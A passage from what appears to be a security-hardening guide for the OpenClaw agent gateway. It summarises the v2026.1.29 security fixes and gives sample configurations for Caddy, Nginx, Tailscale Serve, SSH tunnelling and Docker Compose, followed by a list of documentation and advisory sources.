**Fix**: v2026.1.29 requires users to manually confirm any new gateway URL in the UI.

**Impact**: Full RCE on the Gateway host -- attacker can modify config, disable sandbox, and invoke privileged tools.

### v2026.1.29 Security Changes (Summary)

- Auth mode `"none"` removed -- fail-closed by default
- Loopback connections treated as remote unless trusted proxy headers present
- Hardened Tailscale Serve auth (validates via local tailscaled)
- mDNS minimal by default
- DNS pinning for URL fetches (mitigates rebinding)
- Twilio webhook signature verification enforced
- External hook content wrapped by default
- ngrok free tier bypass disabled by default
- Doctor warnings for gateway exposure without auth

---

## 12. Quick Reference: Configuration Examples

### Minimal VPS Setup (Behind Caddy)

```json5
// ~/.openclaw/openclaw.json
{
  "gateway": {
    "mode": "local",
    "bind": "loopback",
    "port": 18789,
    "trustedProxies": ["127.0.0.1"],
    "auth": {
      "mode": "token",
      "token": "CHANGE-ME-use-openssl-rand-hex-32",
      "allowTailscale": false
    },
    "controlUi": {
      "enabled": true,
      "allowInsecureAuth": false
    }
  },
  "agents": {
    "defaults": {
      "model": {
        "primary": "anthropic/claude-sonnet-4-20250514"
      },
      "sandbox": {
        "mode": "all",
        "scope": "session"
      }
    }
  }
}
```

### Caddy (with domain)

```
openclaw.example.com {
    reverse_proxy 127.0.0.1:18789
}
```

### Caddy (IP-only, self-signed or Let's Encrypt IP cert)

```
https://203.0.113.42 {
    tls internal
    reverse_proxy 127.0.0.1:18789
}
```

### Nginx (Full WebSocket Proxy)

```nginx
server {
    listen 443 ssl http2;
    server_name openclaw.example.com;

    ssl_certificate     /etc/letsencrypt/live/openclaw.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/openclaw.example.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:18789;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header Host $host;
        proxy_read_timeout 86400s;
        proxy_send_timeout 86400s;
    }
}
```

### Tailscale Serve (No Reverse Proxy Needed)

```bash
openclaw gateway --tailscale serve --bind loopback
```

This automatically:
- Keeps Gateway on loopback
- Tailscale Serve provides HTTPS and proxies to the Gateway
- `allowTailscale: true` accepts Tailscale identity headers
- No need for `trustedProxies` (Tailscale handles it)

### SSH Tunnel (Simplest Remote Access)

```bash
# On your local machine:
ssh -N -L 18789:127.0.0.1:18789 user@your-vps

# Then open in browser:
# http://localhost:18789/
```

No reverse proxy, no TLS config, no `trustedProxies` needed. The browser sees `localhost`, so device identity works and auto-approve applies.

### Docker Compose (with External Proxy)

```yaml
services:
  openclaw:
    image: openclaw/openclaw:latest
    environment:
      - OPENCLAW_GATEWAY_TOKEN=your-secret-token
      - OPENCLAW_STATE_DIR=/data/.openclaw
      - OPENCLAW_WORKSPACE_DIR=/data/workspace
    volumes:
      - openclaw-data:/data
    ports:
      - "127.0.0.1:18789:18789"  # Only expose to localhost
    restart: unless-stopped

volumes:
  openclaw-data:
```

Then proxy with Caddy/nginx on the host, with `trustedProxies` set to the Docker bridge IP or `127.0.0.1` (depending on networking mode).

### Generate a Secure Token

```bash
openssl rand -hex 32
# or
openclaw doctor --generate-gateway-token
```

---

## Sources

### Official Documentation
- https://docs.openclaw.ai/gateway/security
- https://docs.openclaw.ai/gateway/remote
- https://docs.openclaw.ai/gateway
- https://docs.openclaw.ai/cli/gateway
- https://docs.openclaw.ai/web/control-ui
- https://docs.openclaw.ai/start/getting-started
- https://docs.openclaw.ai/configuration

### GitHub
- https://github.com/openclaw/openclaw/releases/tag/v2026.1.29
- https://github.com/openclaw/openclaw/issues/1679
- https://github.com/openclaw/openclaw/issues/2248
- https://github.com/openclaw/openclaw/issues/4941
- https://github.com/openclaw/openclaw/issues/3780
- https://github.com/openclaw/openclaw/issues/1690
- https://github.com/openclaw/openclaw/security/advisories/GHSA-g8p2-7wf7-98mq
- https://github.com/openclaw/openclaw/blob/main/docs/gateway/pairing.md
- https://github.com/MaTriXy/openclaw-docker

### Community & Third-Party
- https://www.digitalocean.com/community/tutorials/how-to-run-openclaw
- https://www.digitalocean.com/blog/technical-dive-openclaw-hardened-1-click-app
- https://maordayanofficial.medium.com/the-sovereign-ai-security-crisis-42-000-exposed-openclaw-instances-and-the-collapse-of-1e3f2687b951
- https://composio.dev/blog/secure-openclaw-moltbot-clawdbot-setup
- https://www.pulumi.com/blog/deploy-openclaw-aws-hetzner/
